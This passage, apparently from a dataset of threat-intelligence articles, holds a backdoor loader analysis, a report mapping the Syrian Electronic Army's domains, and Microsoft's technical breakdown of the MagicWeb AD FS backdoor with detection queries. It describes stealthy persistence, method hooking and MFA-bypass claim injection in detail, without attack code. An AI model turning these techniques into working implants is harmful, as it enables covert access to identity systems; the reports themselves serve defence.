weren’t able to retrieve its dropper. Therefore, it is possible to obtain the location of the configuration file from which the backdoor tried to load the parameters, but not the exact location in which the dropper deployed the implant artifact. Furthermore, the used paths are very stealthy and it is easy to confuse the artifacts as components of legitimate programs, such as Adobe Reader or Windows Mixed Reality . In particular, the path of the first sample is the same used by the legitimate Adobe Reader installation and therefore the lib3DXquery.dll file matches up perfectly with the other Adobe components, making it almost totally invisible. The configuration file written, at first glance, seems to be totally encrypted and incomprehensible without analyzing the next stage. The following image shows the configuration file in its raw form. The retrieved backdoor implants are identified by the following hashes: Once again, the libraries export several functions but only one is useful to execute their real payload. To begin, the library checks the presence of the associated configuration file, if it does not exist, the backdoor terminates its execution. Vice versa, once found the file the malware starts to decode and read the current configuration. The first 5 bytes of the file contains the size of the data to read starting from the 6 th bytes and which contains the first encoded information useful to allow the malware to load the entire configuration. All the data retrieved in this first phase is encoded using a simple XOR algorithm with a fixed key 19 B9 20 5A B8 EF 2D A3 73 08 C1 53 , hardcoded at the beginning of the function as represented in the following image. So, the malware reads the first 5 bytes and decodes it using the key, obtaining the number of the bytes it has to read to obtain the initial configuration. In this specific case, from the decoded bytes it gets the value 00081 . So, it proceeds to read other next 81 bytes . Decoding these last ones with the usual key, it obtains a string composed by different parameters separated by “ || ”, as illustrated below. However, this is still not the final configuration used by the malware, but it contains only the parameters to load the last malicious Windows library, named LastJournalx32.adf , containing the final agent. This payload is hidden into the configuration file after a section of random bytes used by the attackers to change the hash value of the file at every infection. During its activity, the loader decrypts and maintains in memory the complete configuration used during the infection chain. It consists of different JSON formatted structures that look like the following: The structure contains all the information necessary for the loader to correctly launch the final agent. Some of these information are AgentFileSystemName , AgentExportName and AgentName . The agent shares the same memory space of the loader, thus it is able to access to the same configuration and to extract the needed parameters, such as the object named Credentials . It also contains the domain name ( newshealthsport[.]com ) and the path (/sport/latest.php ) of the command-and-control with which the agent will communicate. From the configuration it is also possible to notice the version number of the malware, specifically it is 19.03.28 for the AgentLoader and 19.7.16 for the Agent . Moreover, the agent is identified by an ID addressed by the AgentID entry that is used during the communication with the C2 as identifier of the infected machine. The configuration also embeds a specific structure for persistence mechanisms that appears as follow: The implant supports different types of persistence mechanisms: through Service Manager , Task Scheduler , via Registry Key or using Windows GPO. In this specific case, attackers enabled the Service method that allows the malware to interact with the SCManager to create a new service named Adobe Update Module pointing to the path of the loader. The last payload is identified by the following hash: It is responsible for exfiltrating information from the infected machine, sending it to the command-and-control and downloading new commands to be executed. To make the communication with the C2 stealthier, the agent uses a set of keywords to separate the data within a POST request. The keywords are specified by attackers during development phase. In the analyzed case, they are the following: So, during the exfiltration phase, the HTTP requests appear as reported in the table below All the values embedded into the request are encrypted, probably using one of the keys embedded into the previous configuration. The algorithm used during the encryption phase is most probably a custom one. Below, we report a simple scheme of the described infection chain, highlighting the three components of this new threat: the dropper , the loader and the agent . As mentioned above, the malware is able to create services or tasks or to add registry keys to achieve persistence. In the analyzed case, the loader component is set to create a new Windows service, specifying its path location as ImagePath . Check other cyber reports on our site."
6fc80ebc-7bbe-57ec-91dd-f4612ca4afe1,11-October-2022,On the Frontlines of the Syrian Electronic Army’s Digital Arsenal,"Syrian Electronic Army is a group of threat actors believed to be targeting PayPal, eBay, and other targets. Researchers found hundreds of suspicious domains and IP addresses tied to the threat group. Most of the domains were registered to Hotmail and Gmail accounts.","The Syrian Electronic Army (SEA) is a group of threat actors that have been around since 2011. Some of their possible victims are PayPal, eBay, Twitter, media outlets, and some U.S. government websites. Last year, suspected SEA members were seen sending phishing links disguised as social media URLs to targets. While there is no direct confirmation that the Syrian government supervises the group, researchers found some evidence supporting this claim. Many also believe that other nations may be using the army because of its effectiveness. To assist law enforcement agencies and the cybersecurity community in tracking down the threat group, WhoisXML API threat researcher Dancho Danchev took a deeper look inside SEA’s digital infrastructure, revealing: Our researchers further dissected these suspicious cyber resources and uncovered more connected domains and IP addresses. A sample of the additional artifacts obtained from our analysis is available for download from our website . Most of the email addresses tied to the threat group were Hotmail and Gmail accounts. Danchev retrieved 34 of them, along with 238 domain names and 444 responding IP addresses. Most of the email addresses contained random text strings in their usernames, but we also noticed some that contained the strings “syrian” and “whitehouse.” On the other hand, the domain names didn’t have a significant theme. They were primarily generic domains that could be tied to businesses like “airport van rentals,” “gikitchen,” and “theatre confetti.” However, some are potentially cybersquatting domains, such as: The domains were also concentrated in seven TLD spaces—.com, .info, .org, .net, .biz, .gov, and .ca. The chart below shows the distribution of the domains across these TLDs. The IP addresses were spread across 28 countries, although about 60% are geolocated in the U.S. The top IP geolocations are shown in the chart below. With the help of the Reverse WHOIS operations, 771 additional domains related to the threat group were found. These domains were registered using the SEA email addresses at some point. Reverse IP lookups for the responding IP addresses also led us to more connected domains. In total, 1,457 indicators of compromise (IoCs) and artifacts related to SEA were uncovered in this study. We analyzed these using WHOIS and DNS intelligence. Subjecting the IoCs and related properties to a bulk WHOIS lookup determined that most of them (30%) belonged to the American Registry for Internet Numbers (ARIN). GoDaddy was the leading registrar, accounting for 12% of the registrations, followed by Google with 6%. The rest of the top registrars are shown in the graph below. While the properties resolved to IP addresses assigned to more than 180 Internet service providers (ISPs), Amazon topped the list, accounting for 22% of the IP resolutions. Google and GoDaddy also appeared in the top 10, with shares of 7% and 4%, respectively. It was previously mentioned that the responding IP addresses directly connected to the threat group were primarily geolocated in the U.S. This finding is consistent when the artifacts were included in the analysis. For both WHOIS registration and IP geolocation, the properties were mostly located in the U.S., accounting for 59.9% of the IP resolutions and 62% of the domain registrations. This location contextualization may help security teams expand their visibility as threat actors may continue to mask their locations. Out of 1,009 connected domains, only five have been flagged as malicious in our analysis. That leaves the actors with the majority of the domains that they can potentially use in malicious activities. Law enforcers have been after SEA for some time now and even indicted two members in 2018. The cybersecurity community also wants to crack down on the threat group. Mapping out its digital footprint is a crucial step toward achieving this goal. If you wish to perform a similar investigation or get access to the full data behind this research, please don’t hesitate to contact us ."
9af60733-dd94-5fb7-91f0-3fab0a08eb45,24-August-2022,MagicWeb: NOBELIUM’s post-compromise trick to authenticate as anyone,Microsoft security researchers have discovered a post-compromise capability called MagicWeb. MagicWeb is a malicious DLL that manipulates user authentication certificates. Microsoft says the capability is used by a threat actor to maintain persistent access to compromised environments.,"Updated August 26, 2022 : Added instructions to enable collection of AD FS event logs in order to search for Event ID 501, and added a new resource for AD FS audit logging in Microsoft Sentinel . Microsoft security researchers have discovered a post-compromise capability we’re calling MagicWeb, which is used by a threat actor we track as NOBELIUM to maintain persistent access to compromised environments. NOBELIUM remains highly active, executing multiple campaigns in parallel targeting government organizations, non-governmental organizations (NGOs), intergovernmental organizations (IGOs), and think tanks across the US, Europe, and Central Asia. The Microsoft Threat Intelligence Center (MSTIC) assesses that MagicWeb was likely deployed during an ongoing compromise and was leveraged by NOBELIUM possibly to maintain access during strategic remediation steps that could preempt eviction. NOBELIUM has used abuse of identities and credentialed access as a method for maintaining persistence, and a specialized capability like MagicWeb is not novel for the actor: in September 2021, Microsoft disclosed a post-exploitation capability named FoggyWeb with methods and intent similar to MagicWeb. FoggyWeb was capable of exfiltrating the configuration database of compromised AD FS servers, decrypting token-signing certificates and token-decryption certificates , and downloading and executing additional malware components. MagicWeb goes beyond the collection capabilities of FoggyWeb by facilitating covert access directly. MagicWeb is a malicious DLL that allows manipulation of the claims passed in tokens generated by an Active Directory Federated Services (AD FS) server. It manipulates the user authentication certificates used for authentication, not the signing certificates used in attacks like Golden SAML. NOBELIUM was able to deploy MagicWeb by first gaining access to highly privileged credentials and moving laterally to gain administrative privileges to an AD FS system. This is not a supply chain attack. The attacker had admin access to the AD FS system and replaced a legitimate DLL with their own malicious DLL, causing malware to be loaded by AD FS instead of the legitimate binary. The backdoor was discovered by Microsoft’s Detection and Response Team (DART) in coordination with MSTIC and Microsoft 365 Defender Research during an ongoing incident response investigation. Microsoft is sharing this information with consent from the client. At the time of this investigation, MagicWeb appears to be highly targeted. Like domain controllers, AD FS servers can authenticate users and should therefore be treated with the same high level of security. Customers can defend against MagicWeb and other backdoors by implementing a holistic security strategy including the AD FS hardening guidance . In the case of this specific discovery, MagicWeb is one step of a much larger intrusion chain that presents unique detection and prevention scenarios. With all critical infrastructure such as AD FS, it is important to ensure attackers do not gain administrative access. Once attackers gain administrative access, they have many options for further system compromise, activity obfuscation, and persistence. We recommend that any such infrastructure is isolated, accessible only by dedicated admin accounts, and regularly monitored for any changes. Other security measures that can prevent this and other attacks include credential hygiene to prevent lateral movement. AD FS is an on-premises server, and as with all on-premises servers, deployments can get out of date and/or go unpatched, and they can be impacted by local environment compromises and lateral movement. For these reasons, migration to a cloud-based identity solution such as Azure Active Directory for federated authentication is recommended for the robust security it provides. See the mitigation section below for more information. Though we assess the capability to be in limited use, Microsoft anticipates that other actors could adopt similar methodologies and therefore recommends customers review hardening and mitigation guidance provided in this blog. How MagicWeb subverts authentication MagicWeb is a post-compromise malware that can only be deployed by a threat actor after gaining highly privileged access to an environment and moving laterally to an AD FS server. To achieve their goal of maintaining persistent access to an environment by validating authentication for any user account on the AD FS server, NOBELIUM created a backdoored DLL by copying the legitimate Microsoft.IdentityServer.Diagnostics.dll file used in AD FS operations. The legitimate version of this file is catalog signed by Microsoft and is normally loaded by the AD FS server at startup to provide debugging capabilities. NOBELIUM’s backdoored version of the file is unsigned. The threat actor’s highly privileged access that allowed them to access the AD FS server meant they could have performed any number of actions in the environment, but they specifically chose to target an AD FS server to facilitate their goals of persistence and information theft during their operations. After gaining administrative access to an AD FS server via elevation of privilege and lateral movement, the loading of NOBELIUM’s malicious Microsoft.IdentityServer.Diagnostics.dll into the AD FS process is possible by editing C:\Windows\AD FS\Microsoft.IdentityServer.Servicehost.exe.config to specify a different public token, which controls what loads into the AD FS process when it is started. Because AD FS is a .NET application, it loads the DLLs specified in the config file from the Global Assembly Cache (GAC). By changing the token in the configuration, the adversary directed AD FS to load in the malicious DLL. The interception and manipulation of claims by MagicWeb enables the actor to generate tokens that allow the adversary to bypass AD FS policies (role policies, device policies, and network policies) and sign in as any user with any claims, including multifactor authentication (MFA). Figure 1. C:\Windows\AD FS\Microsoft.IdentityServer.Servicehost.exe.config being set to load Microsoft.IdentityServer.Diagnostics.dll Figure 2. NOBELIUM uses a different public token than the legitimate Microsoft.IdentityServer.Diagnostics.dll , telling AD FS to look for a different file in the GAC Figure 3. Close up from Microsoft.IdentityServer.Servicehost.exe.config showing MagicWeb’s malicious PublicKeyToken compared to the PublicKeyToken of the legitimate version of the DLL Figure 4. The directories in the GAC on a server infected with MagicWeb; the malicious Microsoft.IdentityServer.Diagnostics.dll file and the legitimate one are located in different directories To understand how NOBELIUM can subvert the AD FS process with the MagicWeb malware, it’s important to understand how AD FS claims work. AD FS extends the ability to use single sign-on functionality available within a single security or enterprise boundary to internet-facing applications to provide customers, partners, and suppliers a streamlined user experience while accessing an organization’s web-based applications. AD FS relies on claims-based authentication to validate the identity of the user and their authorization claims. These claims are packaged into a token that can be used for authentication. MagicWeb injects itself into the claims process to perform malicious actions outside the normal roles of an AD FS server. Figure 5. How the AD FS claims pipeline issues a token for a user entering a federated application Security Assertion Markup Language (SAML) uses x509 certificates to establish trust relationships between identity providers and services and to sign and decrypt tokens. These x509 certificates contain enhanced key usage (EKU) values that specify what applications the certificate should be used for. For instance, an EKU containing an Object Identifier (OID) value of 1.3.6.1.4.1.311.20.2.2 would allow for the use of a SmartCard logon. Organizations can create custom OIDs to further narrow certificate usage. MagicWeb’s authentication bypass comes from passing a non-standard Enhanced Key Usage OID that is hardcoded in the MagicWeb malware during an authentication request for a specified User Principal Name. When this unique hard coded OID value is encountered, MagicWeb will cause the authentication request to bypass all standard AD FS processes (including checks for MFA) and validate the user’s claims. MagicWeb is manipulating the user authentication certificates used in SAML sign-ins, not the signing certificates for a SAML claim used in attacks like Golden SAML. Figure 6. Example of a user certificate accepted by MagicWeb; the highlighted numbers under “Unknown Key Usage” is one of two OIDs hardcoded into MagicWeb Figure 7. Example of a user certificate chain, which shows an invalid digital signature but still works for authentication NOBELIUM uses unique tradecraft per target, so it’s highly likely that the OIDs and public tokens are unique per target as well. We’ve redacted these OIDs and tokens in this report. Please see the hunting guidance section for information on how to look for variants related to this attack. How to mitigate this threat NOBELIUM’s ability to deploy MagicWeb hinged on having access to highly privileged credentials that had administrative access to the AD FS servers, giving them the ability to perform whatever malicious activities they wanted to on the systems they had access to. It’s critical to treat your AD FS servers as a Tier 0 asset, protecting them with the same protections you would apply to a domain controller or other critical security infrastructure. AD FS servers provide authentication to configured relying parties, so an attacker who gains administrative access to an AD FS server can achieve total control of authentication to configured relying parties (include Azure AD tenants configured to use the AD FS server). Practicing credential hygiene is critical for protecting and preventing the exposure of highly privileged administrator accounts. This especially applies on more easily compromised systems like workstations with controls like logon restrictions and preventing lateral movement to these systems with controls like the Windows Firewall. Migration to Azure Active Directory (Azure AD) authentication is recommended to reduce the risk of on-premises compromises moving laterally to your authentication servers. Customers can use the following references on migration: Use the activity report to move AD FS apps to Azure AD Move application authentication to Azure AD Advanced hunting queries Recommended hunting guidance Have Inventory Certificate Issuance policies in your Public Key Infrastructure (PKI) environment, including all EKU attributes used in the environment and compare to known OID values. Hunt across Windows Event Logs by enabling AD FS verbose logging . Enable security auditing to allow collection of the AD FS event logs , and specifically look for Event ID 501 . This event specifies all the EKU attributes on a claim. Hunt across these logs to look for EKU values which your PKI infrastructure isn’t configured to issue. Look for portable executable files in the GAC or AD FS directories on your systems that aren’t signed by Microsoft and inspect these files or submit them for analysis . Perform an audit of your exclusion settings to be sure that the AD FS and GAC are included in scans. Many organizations exclude the AD FS directories from security software scanning because of performance degradation concerns. Microsoft Sentinel Microsoft Sentinel customers who have enabled verbose mode logging for ADFS can use this query to look for suspicious OIDs: https://github.com/Azure/Azure-Sentinel/tree/master/Detections/SecurityEvent/ADFSAbnormalEnhancedKeyUsageAttribute-OID.yaml . NOTE: It’s important to enable the proper connector in Sentinel with the correct Event collection. Refer to this post for more details on AD FS Audit logging collection in Sentinel. Searching for unsigned files in the GAC The legitimate Microsoft.IdentityServer.Diagnostics.dll is catalog signed by Microsoft. Catalog signing is a method Windows uses for validating code integrity different from Authenticode , and is used for offline validation rather than runtime enforcement of running only signed code. The catalog signing on this file means the file may appear to be unsigned on the file properties pane and in file integrity checkers, security tools, and online malware repositories. The scripts below allow you to look for unsigned binaries and understand both catalog-signed binaries and Authenticode-signed binaries. Surface unsigned DLLs in GAC using Microsoft 365 Defender This query surfaces unsigned DLLs in the GAC folder created within the last 60 days. DeviceImageLoadEvents | where FolderPath has @""C:\Windows\Microsoft.NET\assembly\GAC_MSIL\Microsoft.IdentityServer."" and FileName endswith "".dll"" and not(isempty(SHA1)) | join kind = leftanti (DeviceFileCertificateInfo) on SHA1 | distinct DeviceName, FolderPath, FileName, SHA1, SHA256 Enumerate non-Microsoft signed DLLs in the GAC using PowerShell Below is an example script that could be used to enumerate non-Microsoft signed DLLs in the relevant GAC folder, where servers.txt is a list of servers you wish to scan. Because the legitimate Microsoft.IdentityServer.Diagnostics.dll is catalog signed, signing won’t appear when viewing file properties, but it will show in PowerShell querying and on load of the DLL. $servers = get-content -Path (path to file)\servers.txt Foreach ($server in $servers) { Write-Output ""Processing server: $server"" Invoke-Command -ComputerName $server {Get-ChildItem -Filter ""*.dll"" -Recurse ""C:\Windows\Microsoft.NET\assembly\GAC_MSIL\"" | get-authenticodesignature | ft} } Detections Microsoft Defender Antivirus Microsoft Defender Antivirus provides detection for this threat under the following malware name: Trojan:MSIL/MagicWeb.A!dha Microsoft Defender for Endpoint Microsoft Defender for Endpoint customers may see the following alert as an indication of possible attack: ADFS persistent backdoor detected Indicators of compromise (IOCs) Microsoft isn’t sharing IOCs on this NOBELIUM activity at this time. However, NOBELIUM frequently customizes infrastructure and capabilities per campaign, minimizing operational risk should their campaign specific attributes be discovered. If MagicWeb is identified in your environment, it’s unlikely to match any static IOCs from other targets such as a SHA-256 value. It’s recommended to use the hunting guidance provided above to investigate your environment. Technical analysis of MagicWeb NOBELIUM has modified the legitimate Microsoft.IdentityServer.Diagnostics.dll by adding malicious code to the TraceLog class from the Microsoft.IdentityServer.Diagnostics namespace/type. The header section of the TraceLog class from the legitimate Microsoft.IdentityServer.Diagnostics.dll is shown below: Figure 8. The header section of the TraceLog class of Microsoft.IdentityServer.Diagnostics namespace/type from the legitimate Microsoft.IdentityServer.Diagnostics.dll Meanwhile, the header section of the TraceLog class from NOBELIUM’s backdoored version of Microsoft.IdentityServer.Diagnostics.dll is shown below: Figure 9. The header section of the TraceLog class of Microsoft.IdentityServer.Diagnostics namespace from NOBELIUM’s backdoored version of Microsoft.IdentityServer.Diagnostics.dll In the backdoored version of the code, as shown above, NOBELIUM has added a static constructor for the TraceLog class. A static constructor is used to initialize any static data, or to perform a particular action that needs to be performed only once. It’s called automatically before the first instance is created or any static members are referenced. The malicious static constructor gets executed once before the first instance of the TraceLog class is created. Given that new instances of the TraceLog class is created in various locations in this DLL, the execution of the malicious static constructor is guaranteed to occur as soon as the DLL is loaded for the first time (which would be upon startup of the AD FS server after the malicious changes to Microsoft.IdentityServer.Servicehost.exe.config described above). NOBELIUM’s malicious static constructor contains a reference to the Initialize() method from a class named AuthLog . Figure 10. Reference to the Initialize() method from a class named AuthLog in the malicious static constructor The AuthLog class is a brand-new and malicious class that’s been added to the DLL by NOBELIUM. Figure 11. The Initialize() method of the AuthLog class As shown above, the Initialize() method references a class named RuntimeHelper , yet another class added to the DLL by the actor. The primary purpose of the RuntimeHelper class and its OverloadMethod() method is to hook legitimate AD FS related methods at runtime. By hooking the legitimate AD FS methods, the backdoor is capable of intercepting calls to the legitimate methods to instead invoke its own custom methods. The screenshot above shows the following legitimate AD FS methods being hooked by MagicWeb: Target assembly/DLL Target type Target method to hook Malicious hook method (actor introduced) Microsoft.IdentityServer.IdentityModel.dll Microsoft.IdentityModel.X509CertificateChain Build BeginBuild Microsoft.IdentityServer.WebHost.dll Microsoft.IdentityServer.WebHost.WrappedHttpListenerRequest GetClientCertificate BeginGetClientCertificate Microsoft.IdentityServer.WebHost.dll Microsoft.IdentityServer.WebHost.Proxy.ProxyConfigurationData EndpointConfiguration BeginEndpointConfiguration Microsoft.IdentityServer.Service.dll Microsoft.IdentityServer.Service.IssuancePipeline.PolicyEngine ProcessClaims BeginProcessClaims Hook method: BeginBuild() MagicWeb’s BeginBuild() method is used to hook the legitimate target method Build() (from Microsoft.IdentityServer.IdentityModel.dll ). Figure 12. MagicWeb’s BeginBuild() method The BeginBuild() method first calls the MagicWeb’s helper method ValidateX509Extensions() . If the helper method ValidateX509Extensions() returns true, BeginBuild() returns true. If ValidateX509Extensions() returns false, or an exception is thrown by calling ValidateX509Extensions() , BeginBuild() invokes and returns the value returned by the legitimate Build() method from Microsoft.IdentityServer.IdentityModel.dll . This means that before the legitimate target method Build() from the legitimate Microsoft.IdentityServer.IdentityModel.dll gets an opportunity to inspect/build a certificate, MagicWeb’s hook method first inspects the certificate and returns true if the helper method ValidateX509Extensions() returns true. This allows the attacker to subvert the normal certificate inspection/build process by introducing a custom certificate inspection/build method that’s invoked before the legitimate Build() method is invoked. Helper Method: ValidateX509Extensions() MagicWeb’s helper method ValidateX509Extensions() is called by BeginBuild() and other methods. Figure 13. Helper method ValidateX509Extensions() ValidateX509Extensions() returns false if the X509 certificate passed to the method is null or the Microsoft Cryptographic API certificate context handle/pointer isn’t set. Next, the method enumerates the extensions in the X509 certificate passed to the method. If an enumerated extension is of type X509EnhancedKeyUsageExtension , the method iterates the OIDs of the extension, calculating the MD5 hash of each OID (using a custom hash computation helper method ComputeHash() that leverages the .NET MD5 class). If the MD5 hash value of the OID matches one of the two following hardcoded MD5 values, the method returns true (this methodology is used to check if one of the two OID values below are present in the extension): 67F5BD28A842A1C9[REDACTED] (MD5 hash value corresponding to the OID value 1.3.6.1.4.1.311.21.8.868518.12957973.4869258.12250419.[REDACTED].[REDACTED].[REDACTED].[REDACTED] ) 6E3466296D2F63D[REDACTED] (MD5 hash value corresponding to the OID value 1.3.6.1.4.1.311.21.8.868518.12957973.4869258.12250419.[REDACTED].[REDACTED].[REDACTED].[REDACTED] ) If none of the OID values are present, the method returns false. This helper method returns true if the certificate passed to the method contains one of the two magic OID values listed above. Hook method: BeginGetClientCertificate() Figure 14. MagicWeb’s BeginGetClientCertificate() method, used to hook the legitimate target method GetClientCertificate() (from Microsoft.IdentityServer.WebHost.dll ) To retrieve the client’s X509 certificate, this method first calls the legitimate GetClientCertificate() method from Microsoft.IdentityServer.WebHost.dll . Next, the hook method calls the helper method ValidateX509Extensions() to determine whether the client certificate contains one of the two “magic” OID values. If the client certificate contains one of the two OID values, the hook method: Obtains the _adapter field from the current object Obtains the _request field from the _adapter object Sets the value of the m_ClientCertificateError field (from the _request object) to 0 This means that regardless of what the legitimate method GetClientCertificate() (from Microsoft.IdentityServer.WebHost.dll ) sets the m_ClientCertificateError field to, if a client certificate contains one of the magic OID values, the hook method overwrites or sets the m_ClientCertificateError field to 0. By using this technique, the hook method appears to be influencing the normal behavior of the application to treat or accept a non-valid client certificate as a valid certificate. Hook method: BeginProcessClaims() Figure 15. The BeginProcessClaims() method of MagicWeb, used to hook the legitimate target method ProcessClaims() (from Microsoft.IdentityServer.Service.dll ) The hook method first indirectly invokes the legitimate ProcessClaims() method by invoking the ProcessClaims() method of the AuthLog class. On line 198 in figure 16, the hook method calls MagicWeb’s helper method GetClaims() , passing in the processed identity object returned by invoking the legitimate ProcessClaims() method. Figure 16. The GetClaims() helper method As shown above, the GetClaims() method accepts an identity object as a parameter. The method then initializes three variables named type , type2 , and type3 with values obtained from the RuntimeHelper ’s static field/array named types : Figure 17. The three variables initialized with values The types field contains the following values: Figure 18. Values in the types field The assemblyByName2 variable above contains an assembly object representing the legitimate assembly Microsoft.IdentityServer.IdentityModel.dll (if not already loaded, the RuntimeHelper class loads the assembly into the current application domain). By calling the GetType() method, RunHelper initializes the member of the types field/array with .NET types from the Microsoft.IdentityServer.IdentityModel.dll assembly. Returning to the GetClaims() method and the initialization of type , type2 , and type3 the variables type , type2 , and type3 get initialized with the following type objects from Microsoft.IdentityServer.IdentityModel.dll : type: Microsoft.IdentityModel.Claims.IClaimsIdentity type object type2: Microsoft.IdentityModel.Claims.ClaimCollection type object type3: Microsoft.IdentityModel.Claims.Claim type object Next, the GetClaims() method retrieves the Claims property of the Microsoft.IdentityModel.Claims.IclaimsIdentity identity object. It also retrieves the number of claims (of type Microsoft.IdentityModel.Claims.ClaimCollection ) present in the Claims property: Figure 19. GetClaims() retrieving the Claims property GetClaims() then enumerates the claims (of type Microsoft.IdentityModel.Claims.Claim ), retrieving the string containing each claim and the corresponding claim type: Figure 20. GetClaims() enumerating the claims, retrieving the strings, and storing in list As shown above, the claim string and claim type string are then stored in a list named list . This list of claims and their corresponding claim types is then returned to the caller of the GetClaims() method, BeginProcessClaims() . Returning to the BeginProcessClaims() method, after retrieving the claims using the GetClaims() method, the hook method BeginProcessClaims() searches the claims list for presence of a claim with claim type of http://schemas.microsoft.com/claims/authnmethodsreferences: Figure 21. BeginProcessClaims() searching the claims list for a specific claim As shown on line 198 above, the claim(s) of type http://schemas.microsoft.com/claims/authnmethodsreferences (if any) is stored in a list named list . If claim of type http://schemas.microsoft.com/claims/authnmethodsreferences is present and its value is set to http://schemas.microsoft.com/claims/multipleauthn , the hook method returns the IclaimsIdentity object returned by the legitimate target method ProcessClaims() (from Microsoft.IdentityServer.Service.dll ) on line 191 of the hook method. This behavior ensures that if MFA is already satisfied, then the hook method simply acts as a pass-through method and doesn’t affect the normal behavior of the claim processing pipeline. If a claim of type http://schemas.microsoft.com/claims/authnmethodsreferences is not present or its value is not set to http://schemas.microsoft.com/claims/multipleauthn , the hook method proceeds to perform additional checks on the unprocessed claims (that is, the claims contained in the unprocessed identity object identity passed to the hook method). Once again, the hook method obtains a list of claims by calling the GetClaims() helper method. As mentioned above, instead of calling the GetClaims() helper method with the processed identity object returned by invoking the legitimate ProcessClaims() method (stored in the result variable on line 191), the hook method calls the GetClaims() helper method with the unprocessed identity object identity passed to the hook method: Figure 22. The hook method calling GetClaims() On line 204, the hook method enumerates the value of each claim and uses the ComputeHash() helper method to calculate the MD5 hash value of each claim value (from the unprocessed identity object). It then checks if the MD5 value of any of the claims equals the MD5 hash value 6E3466296D2F63DE[REDACTED] . This hash value is the only element of a hardcoded hash list named oidMFAHashes (that is, this list can be expanded to include other hash values of interest): Figure 23. Hardcoded hash list containing the MD5 hash value of a magic OID valuea If none of the claims have a value with MD5 hash value of 6E3466296D2F63DE[REDACTED] , on line 206, the method simply returns the processed identity object returned by the legitimate target method ProcessClaims() (from Microsoft.IdentityServer.Service.dll ) on line 191 of the hook method. As previously discussed, the hash value 6E3466296D2F63DE[REDACTED] corresponds to the OID value 1.3.6.1.4.1.311.21.8.868518.12957973.4869258.12250419.[REDACTED].[REDACTED].[REDACTED].[REDACTED] . Hence, the hook method enumerates the claims and if a claim with value 1.3.6.1.4.1.311.21.8.868518.12957973.4869258.12250419.[REDACTED].[REDACTED].[REDACTED].[REDACTED] isn’t present on the claim list, the hook method simply acts as a pass-through method and doesn’t affect the normal behavior of claim processing pipeline. If by this point in the execution cycle the hook method hasn’t returned yet, it means one of the claims contains the OID value 1.3.6.1.4.1.311.21.8.868518.12957973.4869258.12250419.[REDACTED].[REDACTED].[REDACTED].[REDACTED] (otherwise, according to the logic described in the paragraph above, the hook method would’ve returned). Proceeding with confirmation that one of the claims contains the OID value 1.3.6.1.4.1.311.21.8.868518.12957973.4869258.12250419.[REDACTED].[REDACTED].[REDACTED].[REDACTED] , the hook method proceeds to the section that represents the main purpose of MagicWeb, to perform claim injection. Figure 24. Main section of the code responsible for the claim injection process Before describing the code responsible for the claim injection process, it’s important to revisit what’s already stored in the list and claims variables: list : As mentioned before, the hook method invokes the legitimate method ProcessClaims() to process the incoming identity object. The processed identity object (stored in result on line 191) is then passed to the GetClaims() helper method to obtain a list of claim type/value pairs extracted from the processed identity object (line 198). After obtaining the claim type/value pairs, the claim(s) of type http://schemas.microsoft.com/claims/authnmethodsreferences (if any) are stored in a list named l ist (line 198). Figure 25. The list variable claims : As mentioned above, this variable is used to store a list of claim type/value pairs extracted from the unprocessed identity object: Figure 26. The claims variable With this information in mind (and the fact that one of the claims contains the OID value 1.3.6.1.4.1.311.21.8.868518.12957973.4869258.12250419. [REDACTED] . [REDACTED] . [REDACTED] . [REDACTED] ), once again here’s the first part of the claim injection code: Figure 27. Part of the claim injection code As shown above, if list is empty (that is, the processed identity object contained no claim type/value pairs of type http://schemas.microsoft.com/claims/authnmethodsreferences ), the hook method instead turns to claims (containing the list of all claim type/value pairs extracted from the unprocessed identity object) and searches for claim type/value pairs of type http://schemas.microsoft.com/claims/authnmethodsreferences in the claims list. If the claims list contains one or more claim type/value pairs of type http://schemas.microsoft.com/claims/authnmethodsreferences , the hook method uses the claim information to add an identical claim of type http://schemas.microsoft.com/claims/authnmethodsreferences to the processed identity object (line 213 above). Using this method, if after passing the identity object to the legitimate ProcessClaims() method, no claim of type http://schemas.microsoft.com/claims/authnmethodsreferences is returned by the legitimate method, the hook method manually adds a fraudulent claim of type http://schemas.microsoft.com/claims/authnmethodsreferences to the list of claims returned to the caller of the hooked legitimate method ProcessClaims() . As shown above, to add the fraudulent claim to the list of claims, the hook method calls a helper method named AddClaim() . Figure 28. The helper method Like the code in the helper method GetClaims() , AddClaims() initializes two variables with the following type objects: type : Microsoft.IdentityModel.Claims.IClaimsIdentity type object type2 : Microsoft.IdentityModel.Claims.ClaimCollection type object On line 235, AddClaims() gets the constructor for type Microsoft.IdentityModel.Claims.Claim and invokes the constructor (passing in the claim type and value from the caller of AddClaim() ) to instantiate a new Claim object. Figure 29. The legitimate internal constructor from Microsoft.IdentityModel.Claims.Claim The legitimate internal constructor from Microsoft.IdentityModel.Claims.Claim , retrieved and invoked by AddClaim() , invokes the internal constructor Claim (overloaded method) with the following method parameters: Figure 30. The internal constructor Claim After instantiating a new Claim object, AddClaim() uses the Add() method from type Microsoft.IdentityModel.Claims.ClaimCollection to add the new claim to the identity object passed to AddClaim() by its caller (in this case, the new claim is added to the identity object containing the list of claims returned by the call to the legitimate method ProcessClaims() ). Figure 31. The legitimate method Add() from type Microsoft.IdentityModel.Claims.ClaimCollection , invoked by AddClaim() (line 245) Revisiting the claim injection code in the hook method BeginProcessClaims() (and recalling the fact that one of the claims contains the OID value 1.3.6.1.4.1.311.21.8.868518.12957973.4869258.12250419.[REDACTED].[REDACTED].[REDACTED].[REDACTED] ), here’s the second part of the claim injection code: Figure 32. Second part of the claim injection code Recall that list contains claim type/value pairs of type http://schemas.microsoft.com/claims/authnmethodsreferences extracted from the processed identity object. If none of the claims in list have the value http://schemas.microsoft.com/claims/multipleauthn , the hook method proceeds to call AddClaim() to add a fraudulent claim of type http://schemas.microsoft.com/claims/authnmethodsreferences and value http://schemas.microsoft.com/claims/multipleauthn to the list of claims returned to the caller of the hooked legitimate method ProcessClaims() . Using the fraudulent claim injection techniques described above, if a claim with the Magic OID value 1.3.6.1.4.1.311.21.8.868518.12957973.4869258.12250419. [REDACTED] . [REDACTED] . [REDACTED] . [REDACTED] is presented to AD FS, regardless of how the legitimate hooked method ProcessClaims() handles the claim, the BeginProcessClaims() hook function ensures that a claim with value http://schemas.microsoft.com/claims/multipleauthn is returned to the caller of the legitimate hooked method ProcessClaims() . Hook method: BeginEndpointConfiguration() The backdoor BeginEndpointConfiguration() method, used to hook the legitimate target method EndpointConfiguration() (from Microsoft.IdentityServer.WebHost.dll ) is shown below: Figure 33. BeginEndpointConfiguration() method The enumType variable is initialized with RuntimeHelper.types[0] which is a Microsoft.IdentityServer.WebHost.Proxy.CertificateValidation type object. The PropertyInfo variables propertyInfo , 